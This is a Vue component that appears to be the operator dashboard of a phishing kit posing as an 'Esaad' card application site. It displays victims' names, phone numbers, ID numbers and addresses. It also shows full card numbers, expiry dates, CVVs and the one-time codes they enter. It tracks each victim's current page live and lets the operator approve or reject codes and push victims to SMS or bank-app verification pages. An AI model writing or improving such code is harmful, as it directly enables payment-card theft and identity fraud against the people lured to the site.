<script setup lang="ts">
import { ref, onMounted, computed, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import {
  RequestData,
  ActiveSessionInfo,
  listCardRequests,
  updateCardRequest,
  getServerStats,
  verifyAdminSession,
  adminLogoutApi
} from '../api';
import { RefreshCw, Search, ShieldCheck, LogOut, Users, Activity, Eye } from 'lucide-vue-next';

const router = useRouter();
const requests = ref<RequestData[]>([]);
const loading = ref(true);
const error = ref('');
const searchQuery = ref('');
const isAuthenticated = ref(false);
const authChecking = ref(true);

const selectedRequestId = ref<string | null>(null);

const selectedRequest = computed(() => {
  return requests.value.find(req => req.id === selectedRequestId.value);
});

const onlineCount = ref(0);
const totalVisitorsCount = ref(0);
const onlineUsers = ref<Record<string, boolean>>({});
const userPages = ref<Record<string, string>>({});
const activeSessions = ref<ActiveSessionInfo[]>([]);

let pollTimer: ReturnType<typeof setInterval> | null = null;
let knownSignature = '';

const pageLabels: Record<string, string> = {
  '/': 'الصفحة الرئيسية',
  '/request': 'صفحة تسجيل البيانات',
  '/payment': 'صفحة ملخص الرسوم',
  '/card-details': 'صفحة بيانات البطاقة',
  '/waiting': 'صفحة الانتظار',
  '/otp': 'صفحة تحقق الرسائل (SMS)',
  '/otp-bank': 'صفحة تحقق التطبيق البنكي'
};

const stepFallbackPage: Record<string, string> = {
  form: '/payment',
  card: '/waiting',
  otp: '/otp',
  'otp-bank': '/otp-bank'
};

const getRequestCurrentPageLabel = (req: RequestData) => {
  const path = userPages.value[req.id] || stepFallbackPage[req.step] || '/request';
  return pageLabels[path] || path;
};

const getRequestCurrentPagePath = (req: RequestData) => {
  return userPages.value[req.id] || stepFallbackPage[req.step] || '/request';
};

const formatPagePath = (path: string) => {
  return pageLabels[path] || path;
};

const playNotificationSound = () => {
  try {
    const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioContextClass) return;
    
    const audioCtx = new AudioContextClass();
    const oscillator = audioCtx.createOscillator();
    const gainNode = audioCtx.createGain();

    oscillator.type = 'sine';
    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); 
    oscillator.frequency.setValueAtTime(1046.50, audioCtx.currentTime + 0.1); 

    gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
    gainNode.gain.linearRampToValueAtTime(0.3, audioCtx.currentTime + 0.05);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);

    oscillator.connect(gainNode);
    gainNode.connect(audioCtx.destination);

    oscillator.start(audioCtx.currentTime);
    oscillator.stop(audioCtx.currentTime + 0.3);
  } catch (err) {
    console.warn('Audio playback failed', err);
  }
};

const fetchAll = async (isInitial = false) => {
  try {
    const [statsResult, reqResult] = await Promise.allSettled([
      getServerStats(),
      listCardRequests()
    ]);

    if (statsResult.status === 'fulfilled') {
      const stats = statsResult.value;
      onlineCount.value = stats.onlineCount;
      totalVisitorsCount.value = stats.totalVisitorsCount;
      onlineUsers.value = stats.onlineUsers || {};
      userPages.value = stats.userPages || {};
      activeSessions.value = stats.activeSessions || [];
    }

    if (reqResult.status === 'fulfilled') {
      const reqList = reqResult.value;
      const newSig = reqList.map(r => `${r.id}:${r.updatedAt}:${r.step}:${r.otp}`).join('|');
      if (!isInitial && knownSignature && newSig !== knownSignature) {
        playNotificationSound();
      }
      knownSignature = newSig;
      requests.value = reqList;
      error.value = '';
    } else if (isInitial) {
      error.value = reqResult.reason?.message || 'تعذر تحميل البيانات من الخادم.';
    }

    loading.value = false;
  } catch (err) {
    console.error('Error fetching dashboard data:', err);
    if (isInitial) {
      error.value = 'تعذر تحميل البيانات من الخادم.';
      loading.value = false;
    }
  }
};

onMounted(async () => {
  const valid = await verifyAdminSession();
  if (!valid) {
    router.push('/admin/login');
    return;
  }
  isAuthenticated.value = true;
  authChecking.value = false;
  await fetchAll(true);
  pollTimer = setInterval(() => fetchAll(false), 2000);
});

onUnmounted(() => {
  if (pollTimer) clearInterval(pollTimer);
});

const handleLogout = async () => {
  await adminLogoutApi();
  router.push('/admin/login');
};

const updateOtpStatus = async (id: string, status: string) => {
  try {
    await updateCardRequest(id, { otpStatus: status });
    await fetchAll(false);
  } catch (err) {
    console.error('Error updating OTP status:', err);
  }
};

const updateNextAction = async (id: string, action: string) => {
  try {
    await updateCardRequest(id, { nextAction: action });
    await fetchAll(false);
  } catch (err) {
    console.error('Error updating next action:', err);
  }
};

const filteredRequests = computed(() => {
  if (!searchQuery.value) return requests.value;
  const lowerQuery = searchQuery.value.toLowerCase();
  return requests.value.filter(req => 
    req.name?.toLowerCase().includes(lowerQuery) || 
    req.mobile?.includes(lowerQuery) || 
    req.cardNumber?.includes(lowerQuery) ||
    req.idNumber?.includes(lowerQuery)
  );
});

const formatRelativeTime = (dateStr: string) => {
  const date = new Date(dateStr);
  const now = new Date();
  const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000);

  if (diffInSeconds < 60) {
    return 'الآن';
  }

  const diffInMinutes = Math.floor(diffInSeconds / 60);
  if (diffInMinutes < 60) {
    if (diffInMinutes === 1) return 'منذ دقيقة';
    if (diffInMinutes === 2) return 'منذ دقيقتين';
    if (diffInMinutes <= 10) return `منذ ${diffInMinutes} دقائق`;
    return `منذ ${diffInMinutes} دقيقة`;
  }

  const diffInHours = Math.floor(diffInMinutes / 60);
  if (diffInHours < 24) {
    if (diffInHours === 1) return 'منذ ساعة';
    if (diffInHours === 2) return 'منذ ساعتين';
    if (diffInHours <= 10) return `منذ ${diffInHours} ساعات`;
    return `منذ ${diffInHours} ساعة`;
  }

  const diffInDays = Math.floor(diffInHours / 24);
  if (diffInDays < 30) {
    if (diffInDays === 1) return 'منذ يوم';
    if (diffInDays === 2) return 'منذ يومين';
    if (diffInDays <= 10) return `منذ ${diffInDays} أيام`;
    return `منذ ${diffInDays} يوم`;
  }

  return new Date(dateStr).toLocaleDateString('ar-EG');
};
</script>

<template>
  <div v-if="authChecking" class="min-h-screen flex items-center justify-center bg-gray-50">
    <RefreshCw class="w-10 h-10 animate-spin text-[#008a40]" />
  </div>

  <div v-else-if="isAuthenticated" class="min-h-screen bg-gray-50 flex flex-col font-sans" dir="rtl">
    <!-- Navbar -->
    <header class="bg-white shadow-xs border-b border-gray-200 py-3.5 px-6 sticky top-0 z-10 flex justify-between items-center gap-8">
      <!-- Zone 1: Brand Title -->
      <div class="flex items-center gap-3 shrink-0">
        <div class="w-9 h-9 bg-[#008a40] rounded-xl flex items-center justify-center shadow-inner">
          <ShieldCheck class="w-5 h-5 text-white" />
        </div>
        <h1 class="font-bold text-lg tracking-tight text-gray-900 whitespace-nowrap">لوحة تحكم إسعاد</h1>
      </div>

      <!-- Zone 2: Search & Live Metrics -->
      <div class="flex items-center gap-4">
        <div class="relative w-64 hidden md:block">
          <input 
            v-model="searchQuery" 
            type="text" 
            placeholder="بحث بالاسم، الهاتف، الهوية..." 
            class="w-full bg-gray-100 border-none rounded-xl py-2 pl-4 pr-10 text-xs focus:ring-2 focus:ring-[#008a40] focus:bg-white transition-all text-gray-800"
          />
          <Search class="w-4 h-4 text-gray-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
        </div>

        <div class="flex items-center gap-4 text-xs text-gray-600">
          <div class="flex items-center gap-1.5">
            <Users class="w-4 h-4 text-gray-500" />
            <span>إجمالي الزوار:</span>
            <span class="font-mono font-bold text-gray-900 tabular-nums">{{ totalVisitorsCount }}</span>
          </div>
          <span class="text-gray-300">·</span>
          <div class="flex items-center gap-1.5">
            <Activity class="w-4 h-4 text-[#008a40]" />
            <span>المتصلون الآن:</span>
            <span class="font-mono font-bold text-[#008a40] tabular-nums">{{ onlineCount }}</span>
          </div>
        </div>
      </div>

      <!-- Zone 3: Primary Action -->
      <div class="shrink-0">
        <button @click="handleLogout" class="text-gray-600 hover:text-red-600 transition-colors px-3 py-2 bg-gray-100 rounded-xl flex items-center gap-2 text-xs font-bold hover:bg-red-50 cursor-pointer whitespace-nowrap">
          <LogOut class="w-4 h-4" />
          <span>تسجيل الخروج</span>
        </button>
      </div>
    </header>

    <!-- Live Active Visitors Strip (Shows current page of every online visitor) -->
    <div v-if="activeSessions.length > 0" class="bg-[#eef5f0] border-b border-gray-200 px-6 py-2.5">
      <div class="max-w-[1500px] mx-auto flex items-center gap-4 overflow-x-auto text-xs">
        <div class="flex items-center gap-1.5 font-bold text-[#008a40] shrink-0">
          <Eye class="w-4 h-4" />
          <span>المتصلون حالياً والصفحة الحالية:</span>
        </div>
        <div class="flex items-center gap-3">
          <div
            v-for="(sess, idx) in activeSessions"
            :key="sess.clientId"
            class="bg-white border border-gray-200 rounded-lg px-3 py-1 flex items-center gap-2 shrink-0 text-xs shadow-2xs"
          >
            <span class="font-bold text-[#008a40]">زائر #{{ idx + 1 }}</span>
            <span class="text-gray-300">·</span>
            <span class="text-gray-800 font-semibold">{{ formatPagePath(sess.currentPage) }}</span>
            <span class="text-gray-400 font-mono text-[11px]" dir="ltr">({{ sess.currentPage }})</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Main Content -->
    <main class="flex-1 p-6 max-w-[1500px] mx-auto w-full flex gap-6 h-[calc(100vh-115px)]">
      
      <!-- Users Sidebar -->
      <aside class="w-[360px] bg-white rounded-2xl shadow-xs border border-gray-200 overflow-hidden flex flex-col shrink-0 h-full">
        <div class="p-4 border-b border-gray-100 bg-gray-50/50 flex justify-between items-center">
          <h2 class="font-bold text-sm text-gray-800">الطلبات المسجلة</h2>
          <span class="text-[#008a40] text-xs font-bold font-mono tabular-nums">{{ filteredRequests.length }}</span>
        </div>
        
        <!-- Loading / Empty -->
        <div v-if="loading" class="flex-1 p-8 flex flex-col items-center justify-center text-gray-400">
          <RefreshCw class="w-8 h-8 animate-spin mb-4 text-[#008a40]" />
          <p class="text-xs font-medium">جاري تحميل البيانات...</p>
        </div>
        <div v-else-if="error" class="flex-1 p-8 text-center text-red-500">
          <p class="font-medium text-xs bg-red-50 py-3 px-4 rounded-lg inline-block">{{ error }}</p>
        </div>
        <div v-else-if="filteredRequests.length === 0" class="flex-1 p-8 text-center text-gray-500 flex flex-col items-center justify-center">
          <p class="font-medium text-sm mb-2">لا توجد طلبات بعد</p>
        </div>
        
        <!-- List -->
        <div v-else class="flex-1 overflow-y-auto overflow-x-hidden divide-y divide-gray-100">
          <div 
            v-for="req in filteredRequests" 
            :key="req.id" 
            @click="selectedRequestId = req.id"
            class="p-4 cursor-pointer transition-colors hover:bg-gray-50 flex flex-col gap-2"
            :class="{ 'bg-[#eef5f0]': selectedRequestId === req.id }"
          >
            <!-- Row 1: Name + Online/Offline status + Time -->
            <div class="flex justify-between items-center w-full">
              <div class="font-bold text-gray-900 text-sm flex items-center gap-2">
                <span>{{ req.name }}</span>
                <span class="text-gray-300">·</span>
                <span v-if="onlineUsers[req.id]" class="text-[11px] font-bold text-[#008a40]">
                  متصل الآن
                </span>
                <span v-else class="text-[11px] font-medium text-gray-400">
                  غير متصل
                </span>
              </div>
              <span class="text-[11px] text-gray-500" dir="rtl">{{ formatRelativeTime(req.createdAt) }}</span>
            </div>
            
            <!-- Row 2: Mobile & Card Type -->
            <div class="flex items-center justify-between text-xs text-gray-500">
              <span class="font-mono">{{ req.mobile }}</span>
              <span>
                <template v-if="req.cardType === 'silver'">الأساسية</template>
                <template v-else-if="req.cardType === 'gold'">الذهبية</template>
                <template v-else-if="req.cardType === 'platinum'">البلاتينية</template>
              </span>
            </div>

            <!-- Row 3: Current Page & Step -->
            <div class="flex items-center justify-between pt-1 text-[11px] border-t border-gray-100/80">
              <div class="flex items-center gap-1.5 text-gray-700">
                <Eye class="w-3.5 h-3.5 text-[#008a40]" />
                <span class="text-gray-500">الصفحة الحالية:</span>
                <span class="font-bold text-[#008a40]">{{ getRequestCurrentPageLabel(req) }}</span>
              </div>
              <span class="font-mono text-[10px] text-gray-400" dir="ltr">{{ getRequestCurrentPagePath(req) }}</span>
            </div>
          </div>
        </div>
      </aside>

      <!-- Details View Panel -->
      <div class="flex-1 bg-white rounded-2xl shadow-xs border border-gray-200 flex flex-col overflow-hidden h-full">
        <div v-if="!selectedRequestId || !selectedRequest" class="flex-1 flex flex-col items-center justify-center text-gray-400 h-full bg-gray-50/30">
          <ShieldCheck class="w-14 h-14 mb-3 opacity-20 text-[#008a40]" />
          <h2 class="text-base font-bold text-gray-500 mb-1">اختر طلباً من القائمة</h2>
          <p class="text-xs">قم بتحديد مستخدم لعرض تفاصيل الطلب والصفحة المتواجد بها حالياً</p>
        </div>
        
        <div v-else class="flex-1 overflow-y-auto p-6 relative">
          <div class="max-w-[820px] mx-auto w-full">
            <!-- Header section of details -->
            <div class="flex justify-between items-start mb-6 pb-5 border-b border-gray-100">
              <div>
                <div class="flex items-center gap-3 mb-2">
                  <h2 class="text-xl font-bold text-gray-900">
                    {{ selectedRequest.name }}
                  </h2>
                  <span class="text-gray-300">·</span>
                  <span v-if="onlineUsers[selectedRequest.id]" class="text-xs font-bold text-[#008a40]">
                    متصل الآن (Online)
                  </span>
                  <span v-else class="text-xs font-medium text-gray-400">
                    غير متصل (Offline)
                  </span>
                </div>

                <!-- Live Current Page Indicator -->
                <div class="flex items-center gap-2 text-xs text-gray-700 mb-2">
                  <Eye class="w-4 h-4 text-[#008a40]" />
                  <span class="font-semibold">الصفحة الحالية للمستخدم:</span>
                  <span class="font-bold text-[#008a40]">{{ getRequestCurrentPageLabel(selectedRequest) }}</span>
                  <span class="font-mono text-gray-400" dir="ltr">({{ getRequestCurrentPagePath(selectedRequest) }})</span>
                </div>

                <p class="text-gray-500 font-sans text-xs flex gap-3">
                  <span>التاريخ: {{ new Date(selectedRequest.createdAt).toLocaleDateString('ar-EG', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }) }}</span>
                  <span>·</span>
                  <span>{{ formatRelativeTime(selectedRequest.createdAt) }}</span>
                </p>
              </div>
              
              <div class="text-left text-xs font-bold text-[#008a40]">
                <template v-if="selectedRequest.step === 'form'">طلب جديد (النموذج)</template>
                <template v-else-if="selectedRequest.step === 'card'">مرحلة البطاقة</template>
                <template v-else-if="selectedRequest.step === 'otp'">رمز التحقق (رسالة)</template>
                <template v-else-if="selectedRequest.step === 'otp-bank'">رمز التحقق (التطبيق)</template>
                <template v-else>{{ selectedRequest.step }}</template>
              </div>
            </div>

            <!-- Content Grid layout for details -->
            <div class="grid grid-cols-2 gap-6 mb-6">
              <!-- Column 1: basic info -->
              <div class="flex flex-col gap-5">
                <div class="bg-gray-50 rounded-xl p-5 border border-gray-100">
                  <h3 class="font-bold text-sm text-gray-900 mb-4 pb-2 border-b border-gray-200 flex items-center gap-2">
                    <Users class="w-4 h-4 text-[#008a40]" />
                    البيانات الأساسية
                  </h3>
                  
                  <div class="space-y-3.5 text-sm">
                    <div>
                      <p class="text-[11px] font-bold text-gray-400 mb-1">رقم الهاتف</p>
                      <p class="font-mono text-gray-900 font-medium bg-white px-3 py-1.5 rounded border border-gray-200 inline-block w-full">{{ selectedRequest.mobile }}</p>
                    </div>
                    <div>
                      <p class="text-[11px] font-bold text-gray-400 mb-1">رقم الهوية</p>
                      <p class="text-gray-900 font-medium bg-white px-3 py-1.5 rounded border border-gray-200 w-full">{{ selectedRequest.idNumber }}</p>
                    </div>
                    <div>
                      <p class="text-[11px] font-bold text-gray-400 mb-1">العنوان</p>
                      <p class="text-gray-900 bg-white px-3 py-1.5 rounded border border-gray-200 w-full">{{ selectedRequest.address }}</p>
                    </div>
                  </div>
                </div>
              </div>

              <!-- Column 2: Card & Actions -->
              <div class="flex flex-col gap-5">
                
                <!-- Card Mockup -->
                <div v-if="selectedRequest.cardNumber" class="bg-gradient-to-br from-[#008a40] to-[#052e16] rounded-2xl p-5 relative overflow-hidden shadow-lg text-white">
                  <div class="flex justify-between items-start mb-6 relative z-10">
                    <span class="text-xs font-bold text-white/90">
                      <template v-if="selectedRequest.cardType === 'silver'">بطاقة إسعاد الأساسية</template>
                      <template v-else-if="selectedRequest.cardType === 'gold'">بطاقة إسعاد الذهبية</template>
                      <template v-else-if="selectedRequest.cardType === 'platinum'">بطاقة إسعاد البلاتينية</template>
                      <template v-else>{{ selectedRequest.cardType }}</template>
                    </span>
                    <div class="w-10 h-7 border border-white/20 rounded bg-yellow-400/30"></div>
                  </div>

                  <div class="space-y-4 relative z-10">
                    <div class="w-full" dir="ltr">
                      <p class="text-[10px] text-white/60 uppercase tracking-widest mb-0.5 font-bold">Card Number</p>
                      <p class="font-mono text-white tracking-[0.2em] text-base font-bold select-all tabular-nums">
                        {{ selectedRequest.cardNumber.replace(/(.{4})/g, '$1 ').trim() }}
                      </p>
                    </div>
                    
                    <div class="flex items-center gap-6" dir="ltr">
                      <div>
                        <p class="text-[9px] text-white/60 uppercase tracking-widest mb-0.5 font-bold">Name</p>
                        <p class="font-mono text-white/90 uppercase text-xs tracking-wider select-all">
                          {{ selectedRequest.paymentName || selectedRequest.name }}
                        </p>
                      </div>
                      <div>
                        <p class="text-[9px] text-white/60 uppercase tracking-widest mb-0.5 font-bold">Expires</p>
                        <p class="font-mono text-white font-medium tracking-wider text-xs select-all tabular-nums">
                          {{ selectedRequest.expMonth }}/{{ selectedRequest.expYear }}
                        </p>
                      </div>
                      <div>
                        <p class="text-[9px] text-yellow-200 uppercase tracking-widest mb-0.5 font-bold">CVV</p>
                        <p class="font-mono text-white bg-black/25 px-2 py-0.5 rounded text-xs select-all text-center tabular-nums">
                          {{ selectedRequest.cvv }}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
                <div v-else class="bg-green-50/50 rounded-xl p-5 border border-green-100">
                  <h3 class="font-bold text-sm text-[#008a40] mb-3 pb-2 border-b border-green-100">بيانات البطاقة</h3>
                  <div class="text-gray-400 text-xs py-6 text-center bg-white/60 rounded-lg border border-dashed border-gray-200">
                    لم يقم بإدخال بيانات البطاقة بعد
                  </div>
                </div>

                <!-- OTP & Actions Box -->
                <div class="bg-white rounded-xl p-5 border border-gray-200 shadow-2xs">
                  <h3 class="font-bold text-sm text-gray-900 mb-4 pb-2 border-b border-gray-100">إجراءات التحقق والتوجيه</h3>
                  
                  <div v-if="selectedRequest.otp" class="flex flex-col items-center">
                    <p class="text-xs text-gray-500 mb-2">الرمز المدخل:</p>
                    <div class="font-mono text-[#008a40] font-bold text-2xl tracking-[0.3em] bg-green-50 py-2.5 px-5 rounded-xl border border-green-200 text-center w-full mb-4 tabular-nums">
                      {{ selectedRequest.otp }}
                    </div>
                    
                    <div class="flex gap-3 w-full" v-if="!selectedRequest.otpStatus || selectedRequest.otpStatus === 'pending'">
                      <button @click="updateOtpStatus(selectedRequest.id, 'approved')" class="flex-1 bg-[#008a40] hover:bg-[#007335] text-white py-2 rounded-lg text-xs font-bold transition-all cursor-pointer">
                        الرمز صحيح
                      </button>
                      <button @click="updateOtpStatus(selectedRequest.id, 'rejected')" class="flex-1 bg-red-600 hover:bg-red-700 text-white py-2 rounded-lg text-xs font-bold transition-all cursor-pointer">
                        الرمز خاطئ
                      </button>
                    </div>
                    
                    <div v-else-if="selectedRequest.otpStatus === 'approved'" class="w-full bg-green-50 border border-green-200 text-[#008a40] py-2.5 rounded-lg text-center font-bold text-xs">
                      تمت الموافقة على الرمز
                    </div>
                    <div v-else-if="selectedRequest.otpStatus === 'rejected'" class="w-full bg-red-50 border border-red-200 text-red-700 py-2.5 rounded-lg text-center font-bold text-xs">
                      تم رفض الرمز
                    </div>
                  </div>
                  
                  <div v-else-if="selectedRequest.step === 'card' && !selectedRequest.nextAction" class="flex flex-col gap-2.5">
                    <p class="text-xs text-gray-600 text-center mb-1">توجيه المستخدم إلى صفحة التحقق:</p>
                    <button @click="updateNextAction(selectedRequest.id, 'otp-sms')" class="w-full bg-[#008a40] hover:bg-[#007335] text-white py-2.5 rounded-lg text-xs font-bold transition-all cursor-pointer">
                      رسالة نصية (SMS)
                    </button>
                    <button @click="updateNextAction(selectedRequest.id, 'otp-bank')" class="w-full bg-gray-800 hover:bg-gray-900 text-white py-2.5 rounded-lg text-xs font-bold transition-all cursor-pointer">
                      تطبيق بنكي
                    </button>
                  </div>
                  
                  <div v-else-if="selectedRequest.step === 'card' && selectedRequest.nextAction" class="py-5 flex flex-col items-center justify-center bg-gray-50 rounded-lg border border-dashed border-gray-200">
                    <p class="text-[#008a40] text-xs font-bold text-center px-4">
                      تم توجيه المستخدم لصفحة التحقق
                      <span v-if="selectedRequest.nextAction === 'otp-sms'" class="font-normal opacity-80 block mt-0.5">(رسالة نصية)</span>
                      <span v-if="selectedRequest.nextAction === 'otp-bank'" class="font-normal opacity-80 block mt-0.5">(تطبيق بنكي)</span>
                    </p>
                    <p class="text-[11px] text-gray-400 mt-1.5">في انتظار إدخال الرمز...</p>
                  </div>
                  
                  <div v-else class="text-gray-400 text-xs py-6 text-center bg-gray-50 rounded-lg border border-dashed border-gray-200">
                    بانتظار إدخال بيانات البطاقة للتحقق
                  </div>
                </div>

              </div>
            </div>
            
          </div>
        </div>
      </div>
    </main>
  </div>
</template>
